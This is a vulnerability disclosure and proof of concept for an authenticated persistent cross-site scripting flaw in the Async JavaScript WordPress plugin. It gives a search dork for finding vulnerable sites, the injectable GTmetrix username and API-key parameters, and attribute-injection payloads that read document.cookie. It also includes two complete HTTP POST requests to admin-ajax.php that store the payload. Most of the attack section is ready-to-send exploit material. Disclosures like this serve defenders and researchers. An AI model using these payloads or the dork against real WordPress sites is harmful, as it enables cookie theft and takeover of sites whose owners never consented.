/*!
- # VULNERABILITY: Async JavaScript WordPress Plugin <= 2.20.12.09 - Authenticated Persistent XSS
- # GOOGLE DORK: inurl:/wp-content/plugins/async-javascript/
- # DATE: 2021-05-01
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: Frank Goossens [ https://autoptimize.com ]
- # SOFTWARE VERSION: <= 2.20.12.09
- # SOFTWARE LINK: https://wordpress.org/plugins/async-javascript/
- # CVSS: AV:N/AC:L/PR:H/UI:N/S:C
- # CWE: CWE-79
- # CVE: N/A
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS vulnerability was discovered in the Async JavaScript plugin through v2.20.12.09 for WordPress.

[i] Vulnerable parameter(s): &aj_gtmetrix_username=, &aj_gtmetrix_api_key=.



### -- [ Impact: ]

[~] Malicious JavaScript code injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] " autofocus=autofocus onfocus=alert(document.cookie); m0ze

[$] " autofocus=autofocus onfocus=alert(origin); m0ze



### -- [ PoC #1 | Authenticated Persistent XSS | Wizard > GTmetrix API Key > aj_gtmetrix_username: ]

[!] POST /wp-admin/admin-ajax.php HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 278

action=aj_steps&sub_action=aj_step2&site_url=https%3A%2F%2Fexample.com&aj_gtmetrix_username=%22+autofocus%3Dautofocus+onfocus%3Dalert(document.cookie)%3B+m0ze&aj_gtmetrix_api_key=%22+autofocus%3Dautofocus+onfocus%3Dalert(origin)%3B+m0ze&aj_gtmetrix_server=1&security=2bf7cfd276



### -- [ PoC #2 | Authenticated Persistent XSS | Wizard > GTmetrix API Key > aj_gtmetrix_api_key: ]

[!] POST /wp-admin/admin-ajax.php HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 278

action=aj_steps&sub_action=aj_step2&site_url=https%3A%2F%2Fexample.com&aj_gtmetrix_username=%22+autofocus%3Dautofocus+onfocus%3Dalert(document.cookie)%3B+m0ze&aj_gtmetrix_api_key=%22+autofocus%3Dautofocus+onfocus%3Dalert(origin)%3B+m0ze&aj_gtmetrix_server=1&security=2bf7cfd276



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
